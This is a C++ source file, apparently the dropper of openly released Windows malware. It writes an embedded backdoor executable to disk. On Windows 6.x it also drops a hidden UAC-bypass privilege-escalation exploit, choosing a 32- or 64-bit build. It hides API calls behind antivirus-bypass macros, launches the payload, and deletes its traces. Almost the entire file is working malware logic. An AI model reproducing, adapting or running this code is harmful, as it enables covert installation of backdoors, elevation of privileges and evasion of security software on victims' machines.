// Copyright 2015 Christian Roggia. All rights reserved.
// Use of this source code is governed by an Apache 2.0 license that can be
// found in the LICENSE file.

#include <windows.h>
#include <iostream>

// Functions for AntiVirus bypass
#include "bypass.hpp"

// Plain installer
#include "installer.hpp"

// Local privileges elevators
#include "x32_elevator.hpp"
#include "x64_elevator.hpp"

// ======= [BEGIN EASY COSTUMIZATION] =======
#define EXPLOIT_EXE_NAME	"temp.exe"
#define BACKDOOR_EXE_NAME	"net.exe"
// ======== [END EASY COSTUMIZATION] ========

#pragma warning(disable : 4996)			// Keep using GetVersionEx()

// Check if the system is vulnerable to a Local Privileges Escalation
BOOL IsVulnerableOS()
{
	OSVERSIONINFO osvInfo;

	memset(&osvInfo, 0, sizeof(OSVERSIONINFO));
	osvInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

	// http://msdn.microsoft.com/en-us/library/windows/desktop/ms724833(v=vs.85).aspx
	// Check version is greater than Windows Vista ©
	if (GetVersionEx(&osvInfo))
		return osvInfo.dwMajorVersion == 6;

	return TRUE;
}

// Check if the architecture is 32 or 64 bit
BOOL IsAMD64()
{
	__tGetNativeSystemInfo lpfnGetNativeSystemInfo;
	SYSTEM_INFO sysInfo;

	memset(&sysInfo, 0, sizeof(SYSTEM_INFO));

	// Simple bypass for AV
	AV_BYPASS__GetNativeSystemInfo(lpfnGetNativeSystemInfo)

	if(NULL != lpfnGetNativeSystemInfo)
		lpfnGetNativeSystemInfo(&sysInfo);
	else
		GetSystemInfo(&sysInfo);

	// This is outdated wProcessorArchitecture instead of dwOemId should be used
	if ((WORD)sysInfo.dwOemId == PROCESSOR_ARCHITECTURE_AMD64)
		return TRUE;

	return FALSE;
}

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	CHAR szShellExecute[14];

	CHAR szWorkFileName[MAX_PATH];
	CHAR szTempPath[MAX_PATH];
	CHAR szWorkDir[MAX_PATH];
	CHAR szNetPath[MAX_PATH];

	GetCurrentDirectory(MAX_PATH, szWorkDir);
	sprintf(szTempPath, "%s\\" EXPLOIT_EXE_NAME, szWorkDir);

	GetModuleFileName(NULL, szWorkFileName, MAX_PATH);
	FILE *f = fopen(szWorkFileName, "rb");

	if (NULL == f)
		return 0;

	// Inject configuration in the executable
	char lpBuf[288] = {};

	fseek(f, 688, 0);
	fread(lpBuf, 1, 288, f);

	memcpy(&g_lpInstaller[688], lpBuf, 288);

	HANDLE hNetHandle;
	__tShellExecute lpfnShellExecute;
	if (TRUE == IsVulnerableOS())
	{
		sprintf(szNetPath, "%s\\" BACKDOOR_EXE_NAME, szWorkDir);

		// Write the backdoor and wait for privileges escalation
		hNetHandle = CreateFile(szNetPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (INVALID_HANDLE_VALUE != hNetHandle)
		{
			DWORD dwTmp = 0;

			WriteFile(hNetHandle, g_lpInstaller, sizeof(g_lpInstaller), &dwTmp, 0); // Original size: 55808
			CloseHandle(hNetHandle);
		}

		// Write exploit to attempt local privileges escalation
		// (See http://www.pretentiousname.com/misc/win7_uac_whitelist2.html for more info)
		HANDLE hTempHandle = CreateFile(szTempPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN, NULL);
		if (INVALID_HANDLE_VALUE != hTempHandle)
		{
			DWORD dwTempTmp = 0, dwSizeTemp;
			const unsigned char *lpBufTemp;

			if (TRUE == IsAMD64())
			{
				dwSizeTemp	= sizeof(g_lpElevator64); // Original size: 88576
				lpBufTemp	= g_lpElevator64;
			}
			else
			{
				dwSizeTemp	= sizeof(g_lpElevator32); // Original size: 81920
				lpBufTemp	= g_lpElevator32;
			}

			WriteFile(hTempHandle, lpBufTemp, dwSizeTemp, &dwTempTmp, 0);
			CloseHandle(hTempHandle);
		}

		Sleep(200);

		// Simple bypass for AV
		AV_BYPASS__ShellExecute(szShellExecute)
		lpfnShellExecute = (__tShellExecute)GetProcAddress(LoadLibrary("Shell32.dll"), szShellExecute);

		// Execute the exploit and try to gain privileges
		if (NULL != lpfnShellExecute(NULL, "Open", szTempPath, NULL, NULL, SW_SHOWNORMAL))
		{
			Sleep(20000);

			DeleteFile(szTempPath);
			DeleteFile(szNetPath);

			return 0;
		}
	}
	else
	{
		sprintf(szNetPath, "%s\\" BACKDOOR_EXE_NAME, szWorkDir);

		// Write the backdoor and skip privileges escalation
		hNetHandle = CreateFile(szNetPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (INVALID_HANDLE_VALUE != hNetHandle)
		{
			DWORD dwTmp_ = 0;

			WriteFile(hNetHandle, g_lpInstaller, sizeof(g_lpInstaller), &dwTmp_, 0); // Original size: 55808
			CloseHandle(hNetHandle);
		}

		Sleep(200);

		// Simple bypass for AV
		AV_BYPASS__ShellExecute(szShellExecute)
		lpfnShellExecute = (__tShellExecute)GetProcAddress(LoadLibrary("Shell32.dll"), szShellExecute);

		// Execute the backdoor without escalating privileges
		if (lpfnShellExecute(NULL, "Open", szNetPath, NULL, NULL, SW_SHOWNORMAL))
		{
			// Simple bypass for AV
			AV_BYPASS__Sleep(20000)

			DeleteFile(szNetPath);
			return 0;
		}
	}

	return 0;
}